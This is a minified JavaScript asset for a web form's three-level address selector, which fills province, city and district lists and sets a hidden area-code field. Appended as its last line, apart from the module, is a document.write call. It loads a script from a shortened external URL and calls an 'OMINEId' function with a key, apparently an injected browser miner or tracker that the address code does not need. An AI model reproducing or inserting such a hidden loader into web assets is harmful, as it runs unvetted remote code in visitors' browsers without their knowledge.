"use strict";define(["jquery","Toolkit/district","css!Home/Public/css/select_address.css"],function(i){var c=i(".js-select-first"),s=i(".js-select-second"),a=i(".js-select-third"),n=i('input[name="company_area"]'),t="";i.each(DISTRICT,function(e,l){t+='<li data-index="'+e+'">'+l.name+"</li>"}),c.children(".lj-option-box").html(t),i(".jl-y-select").on("blur",function(){i(this).removeClass("jl-y-select-active")}),i(".jl-y-select-title").on("click",function(){var e=i(this);e.parent().hasClass("jl-y-select-active")?e.parent().removeClass("jl-y-select-active"):(i(".jl-y-select").removeClass("jl-y-select-active"),e.parent().addClass("jl-y-select-active"))}),i(".js-select-first .lj-option-box").on("click","li",function(){var e=i(this),l=e.data("index");if(e.addClass("lj-active-li").siblings().removeClass("lj-active-li"),c.removeClass("jl-y-select-active").children(".jl-y-select-title").children(".jl-c-c").text(e.text()),DISTRICT[l].cell){s.show(),a.show(),s.removeClass("jl-c-right");var t="";i.each(DISTRICT[l].cell,function(e,l){t+='<li data-index="'+e+'">'+l.name+"</li>"}),s.children(".lj-option-box").html(t),s.children(".jl-y-select-title").children(".jl-c-c").text("请选择"),a.children(".jl-y-select-title").children(".jl-c-c").text("请选择"),""!==n.val()&&(n.val(""),n.change())}else n.val(DISTRICT[l].code),n.change(),s.hide(),a.hide()}),i(".js-select-second .lj-option-box").on("click","li",function(){var e=i(this),l=i(".js-select-first").find(".lj-active-li").data("index"),t=e.data("index");if(e.addClass("lj-active-li").siblings().removeClass("lj-active-li"),s.removeClass("jl-y-select-active").children(".jl-y-select-title").children(".jl-c-c").text(e.text()),DISTRICT[l].cell[t].cell){a.show();var c="";i.each(DISTRICT[l].cell[t].cell,function(e,l){c+='<li data-index="'+e+'">'+l.name+"</li>"}),a.children(".lj-option-box").html(c),a.children(".jl-y-select-title").children(".jl-c-c").text("请选择"),""!==n.val()&&(n.val(""),n.change())}else a.hide(),s.addClass("jl-c-right"),n.val(DISTRICT[l].cell[t].code),n.change()}),i(".js-select-third .lj-option-box").on("click","li",function(){var e=i(this),l=i(".js-select-first").find(".lj-active-li").data("index"),t=i(".js-select-second").find(".lj-active-li").data("index"),c=e.data("index");e.addClass("lj-active-li").siblings().removeClass("lj-active-li"),n.val(DISTRICT[l].cell[t].cell[c].code),n.change(),a.removeClass("jl-y-select-active").children(".jl-y-select-title").children(".jl-c-c").text(e.text())})});
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');